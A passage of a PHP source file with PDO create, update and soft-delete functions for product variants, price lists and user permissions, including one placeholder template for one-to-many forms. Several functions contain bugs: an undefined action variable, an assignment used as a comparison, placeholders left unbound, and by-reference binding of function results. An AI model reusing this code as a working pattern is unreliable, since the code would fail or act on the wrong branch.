        ,ICON_UsuaDate=$gstrFechaHoy,ICON_UsuaID=:ICON_UsuaID
        WHERE ICON_IConID=:ICON_IConID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':ICON_IConID', $intICON_IConID, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_UsuaID', intval($intUsrId), PDO::PARAM_INT);
        $stmt->execute();
        break;
    }
    }
}
function pa_PROD_ConsultaIngProducto($Accion, $Code1, $Parametro1, $Parametro2)
{
    global $db;
    if ($db) {
        switch ($strAccion) {
      case "GETPVAR":
        $strSql="SELECT PVAR_PvarID FROM IngProductoVariable WHERE PVAR_ProdID=:Code1
         AND PVAR_Estatus='A' AND CASE WHEN PVAR_Valor1 IS NULL OR PVAR_Valor1='' THEN '' ELSE PVAR_Valor1 END=:Parametro1
         AND CASE WHEN PVAR_Valor2 IS NULL OR PVAR_Valor2='' THEN '' ELSE PVAR_Valor2 END=:Parametro2";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':Parametro1', $Parametro1, PDO::PARAM_STR);
        $stmt->bindParam(':Parametro2', $Parametro2, PDO::PARAM_STR);
        $stmt->bindParam(':Code1', intval($Code1), PDO::PARAM_INT);
      break;
    }
        $stmt->execute();
        return $stmt;
    } else {
        return null;
    }
}
function sVtaPrecioABC($strAccion, $intCode, $intPREC_ProdID, $dblPREC_Precio, $intPREC_PrecID, $intUsrId, $dblPREC_Descuento)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        switch ($strAccion) {
      case "A":
        $strSql="INSERT INTO VtaPrecio (PREC_LpreID,PREC_ProdID,PREC_Precio,PREC_UsuaID,PREC_Descuento,PREC_UsuaDate)
        VALUES (?,?,?,?,?,$gstrFechaHoy)";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intCode,$intPREC_ProdID,$dblPREC_Precio,$intUsrId,$dblPREC_Descuento]);
        break;
      case "C":
        $strSql="UPDATE VtaPrecio SET PREC_UsuaDate=$gstrFechaHoy, PREC_LpreID=:PREC_LpreID,PREC_ProdID=:PREC_ProdID,PREC_Precio=:PREC_Precio
        ,PREC_UsuaID=:PREC_UsuaID,PREC_Descuento=:PREC_Descuento WHERE PREC_PrecID=:PREC_PrecID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':PREC_LpreID', intval($intCode), PDO::PARAM_INT);
        $stmt->bindParam(':PREC_ProdID', intval($intPREC_ProdID), PDO::PARAM_INT);
        $stmt->bindParam(':PREC_Precio', $dblPREC_Precio, PDO::PARAM_STR);
        $stmt->bindParam(':PREC_UsuaID', intval($intUsrId), PDO::PARAM_INT);
        $stmt->bindParam(':PREC_Descuento', $dblPREC_Descuento, PDO::PARAM_STR);
        $stmt->bindParam(':PREC_PrecID', intval($intPREC_PrecID), PDO::PARAM_INT);
        $stmt->execute();
        break;
      case "B":
        $strSql="UPDATE VtaPrecio SET PREC_UsuaDate=$gstrFechaHoy,PREC_Estatus = 'B'
        ,PREC_UsuaID=:PREC_UsuaID WHERE PREC_PrecID=:PREC_PrecID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':PREC_PrecID', intval($intPREC_PrecID), PDO::PARAM_INT);
        $stmt->bindParam(':PREC_UsuaID', intval($intUsrId), PDO::PARAM_INT);
        $stmt->execute();
        break;
    }
    }
}
// Template abc uno a muchos
function pa_XXXX_abctblNombre($intCode, $strXml, $intUsrId, $strIpAddress)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        $xDoc= new SimpleXMLElement($strXml);
        $tblNombre=$xDoc->tblNombre;
        $strAccion=$tblNombre['Accion'];
        switch ($strAccion) {
      case "A":
        $strSql="INSERT INTO paraModulo (MODU_Clave,MODU_Texto,MODU_Imagen,MODU_Tipo,MODU_Accion,MODU_TextoIng,MODU_Sistema,MODU_Param1,MODU_Date)
        VALUES (?,?,?,?,?,?,?,?,$gstrFechaHoy)";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$tblNombre[''],$tblNombre[''],$tblNombre[''],$tblNombre[''],$tblNombre[''],$tblNombre[''],$tblNombre[''],$tblNombre['']]);
        $intCode=$db->lastInsertId();
      break;
      case "B":
        $strSql="UPDATE tblNombre SET USUA_Estatus= 'B' ,USUA_date=$gstrFechaHoy WHERE USUA_usuaID =?";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intCode]);
      break;
      case "C":
        $strSql="UPDATE tblNombre SET USUA_date=$gstrFechaHoy ,USUA_nombCorto=:USUA_nombCorto,USUA_Paterno=:USUA_Paterno,USUA_Materno=:USUA_Materno,USUA_Nombre=:USUA_Nombre,USUA_PerfilPadreID=:USUA_PerfilPadreID
        ,USUA_Perfil=:USUA_Perfil,USUA_Idioma=:USUA_Idioma WHERE USUA_usuaID =:USUA_usuaID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':USUA_nombCorto', $tblNombre['USUA_nombCorto'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_PerfilPadreID', intval($tblNombre['USUA_PerfilPadreID']), PDO::PARAM_INT);
        $stmt->bindParam(':USUA_usuaID', intval($intCode), PDO::PARAM_INT);
        $stmt->execute();
      break;
    }
        if ($strAccion="C" || $strAccion="A") {
            //INICIO Detalle
            foreach ($xDoc->tblNombre->tblDetalle as $tblDetalle) {
                switch ($tblDetalle['Accion']) {
          case "A":
          $strSql="INSERT INTO paraPermiso (PERM_UsuaID,PERM_ModuID,PERM_Acceso,PERM_Date)
            VALUES (?,?,?,$gstrFechaHoy)";
            $stmt = $db->prepare($strSql);
            $stmt->execute([intval($intCode),$tblDetalle['MODU_moduId'],$tblDetalle['Acceso']]);
            break;
          case "C":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Acceso=:PERM_Acceso WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_Acceso', $tblDetalle['Acceso'], PDO::PARAM_STR);
            $stmt->bindParam(':PERM_permID', intval($tblDetalle['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
          case "B":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Estatus='B' WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_permID', intval($tblDetalle['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
        }
            }
      
            //FIN Detalle
        }
    }
    return $intCode;
}
